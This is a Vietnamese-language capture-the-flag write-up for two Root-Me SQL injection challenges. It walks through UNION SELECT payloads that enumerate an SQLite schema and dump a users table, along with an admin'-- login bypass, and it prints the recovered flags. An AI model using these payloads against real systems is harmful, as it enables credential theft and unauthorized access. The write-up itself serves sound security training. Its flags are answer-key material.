# SQL injection - String
CMS v 0.0.2

http://challenge01.root-me.org/web-serveur/ch19/

**Statement**: Retrieve the administrator password

## Cách làm
### Tìm chức năng dính lỗi SQLi
Sau khi truy cập vào link, ta thấy có các chức năng như trang chủ, đăng nhập, tìm kiếm

![image](https://github.com/aQ05/Write-up/assets/121664384/cf62bf7a-4325-4994-b71b-156e05f23b2f)

Để biết lỗi SQLi xảy ra ở chức năng nào thì ta chỉ cần nhập ký tự `1'` và lỗi SQLi xuất hiện tại ô tìm kiếm

![image](https://github.com/aQ05/Write-up/assets/121664384/85d78798-2c99-4f34-8e7a-e058ec73c2c8)

CSDL được sử dụng ở đây là SQLite3 nên ta sẽ khai thác trên SQLite3.
### Tìm số cột
Đầu tiên sử dụng lệnh `ORDER BY` để kiểm tra số cột cho phép.

Nhập lệnh `1’ order by 1--` và đến `1' order by 3--` thì bị lỗi.

![image](https://github.com/aQ05/Write-up/assets/121664384/37d2dd10-8e0d-48cd-b20b-4f44b58d6530)

Tức là CSDL này có 2 cột. Dùng lệnh `UNION SELCT` để khai thác dữ liệu.
### Exploit
Với SQLite3 (https://www.sqlite.org/faq.html), ta sẽ `SELECT` đến `SQLITE_SCHEMA`

![image](https://github.com/aQ05/Write-up/assets/121664384/7c379380-5410-4360-a210-8ae1eacafb85)

Gõ lệnh `1' union select name,sql from sqlite_master--`, ta sẽ biết được CSDL này có 2 bảng là `news` và `users` với lần lượt là tên cột, kiểu dữ liệu.

![image](https://github.com/aQ05/Write-up/assets/121664384/df32cc27-1c25-403a-9444-fa297dadad2f)

`news (CREATE TABLE news(id INTEGER, title TEXT, description TEXT))`

`users (CREATE TABLE users(username TEXT, password TEXT, Year INTEGER))`

Đề bài yêu cầu tìm password admin nên ta cần truy xuất dữ liệu từ bảng `users`. Thực thi câu lệnh  `1' union select username, password from users --`, ta sẽ tìm được password của admin: `admin (c4K04dtIaJsuWdi)`

![image](https://github.com/aQ05/Write-up/assets/121664384/c1ae054f-3d4b-4b73-ad7c-8784c82412cd)

Và đăng nhập thành công
![image](https://github.com/aQ05/Write-up/assets/121664384/fd7edfcd-7f0e-47d7-9a70-4b19e9e56cd0)

## Flag
`c4K04dtIaJsuWdi`

# SQL injection - Authentication
Authentication v 0.01

**Statement:** Retrieve the administrator password

## Cách làm
Truy cập link http://challenge01.root-me.org/web-serveur/ch9/, ta thấy 1 trang web có chức năng đăng nhập.

Để đăng nhập, nhập `admin'-- ` vào trường `username` với mật khẩu tùy ý.

![image](https://github.com/aQ05/Write-up/assets/121664384/b9d97aa9-71bc-4f07-bbc3-fc8be27c67e9)


Để tìm passwprd, `Ctrl U` để xem source code
![Screenshot 2023-11-05 132759](https://github.com/aQ05/Write-up/assets/121664384/3d6556f8-c513-46af-a414-7babe327713b)


## Flag
`t0_W34k!$`

#

